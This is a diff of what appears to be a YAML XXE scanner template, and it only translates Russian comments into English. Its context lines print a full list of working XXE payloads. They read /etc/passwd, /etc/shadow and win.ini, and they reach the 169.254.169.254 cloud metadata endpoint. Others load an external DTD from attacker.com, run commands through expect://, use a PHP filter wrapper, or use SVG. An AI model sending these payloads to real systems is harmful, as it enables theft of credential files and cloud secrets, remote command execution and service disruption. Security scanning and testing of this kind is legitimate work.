@@ -12,37 +12,37 @@ signatures:
   - "WIN.INI"
   - "nobody:"
 payloads:
-  # --- Классический XXE (Linux) ---
+  # --- Classic XXE (Linux) ---
   - |
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     <root><data>&xxe;</data></root>
 
-  # --- Классический XXE (Windows) ---
+  # --- Classic XXE (Windows) ---
   - |
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
     <root><data>&xxe;</data></root>
 
-  # --- XXE через /etc/shadow ---
+  # --- XXE via /etc/shadow ---
   - |
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
     <root><data>&xxe;</data></root>
 
-  # --- XXE SSRF (внутренний HTTP запрос) ---
+  # --- XXE SSRF (internal HTTP request) ---
   - |
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
     <root><data>&xxe;</data></root>
 
-  # --- Blind XXE OOB (через внешний DTD) ---
+  # --- Blind XXE OOB (via external DTD) ---
   - |
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
     <root><data>test</data></root>
 
-  # --- Blind XXE с извлечением файла через OOB ---
+  # --- Blind XXE with file extraction via OOB ---
   - |
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [
@@ -53,7 +53,7 @@ payloads:
     ]>
     <root><data>test</data></root>
 
-  # --- XXE через параметрические entity (внутри DTD) ---
+  # --- XXE via parameter entities (inside DTD) ---
   - |
     <?xml version="1.0"?>
     <!DOCTYPE data [
@@ -74,24 +74,24 @@ payloads:
     ]>
     <root>&lol5;</root>
 
-  # --- XXE через expect:// (RCE если модуль включён) ---
+  # --- XXE via expect:// (RCE if module is enabled) ---
   - |
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
     <root><data>&xxe;</data></root>
 
-  # --- XXE через PHP wrapper ---
+  # --- XXE via PHP wrapper ---
   - |
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
     <root><data>&xxe;</data></root>
 
-  # --- XXE без XML-заголовка (упрощённый) ---
+  # --- XXE without XML header (simplified) ---
   - |
     <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
     <foo>&xxe;</foo>
 
-  # --- XXE через SVG ---
+  # --- XXE via SVG ---
   - |
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
